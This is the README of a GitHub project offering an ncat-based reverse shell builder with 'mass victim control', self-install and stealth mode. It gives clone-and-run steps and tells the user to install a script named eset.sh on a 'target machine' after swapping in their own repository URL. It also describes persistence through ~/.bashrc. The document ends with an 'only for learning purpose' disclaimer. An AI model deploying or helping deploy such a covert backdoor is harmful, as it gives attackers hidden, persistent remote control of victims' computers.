Simple and very basic ncat based reverse shell creator with mass victim control (not exactly)

### Features include
- Reverse shell
- Self install
- Stealth mode

### Usage

```bash
git clone https://github.com/rohitaryal/-.git
cd -/
chmod +x *.sh
./ip_util.sh $(hostname -I)
```

Remember not to run `eset.sh` on your personal PC although it can be easily removed.
Now install the `eset.sh` in your target machine and make sure you have replaced `URL` in `eset.sh` at line `25` with your repo URL
```bash
./eset.sh # Will do stuff itself
```

### Removal
```
rm -rf ~/.config/eset
```

And remove all entries of `~/.config/eset/eset.sh` from your `~/.bashrc`

### TODO
- Add support for `zsh`
- Add simple nodejs server
---
[!] Only for learning purpose.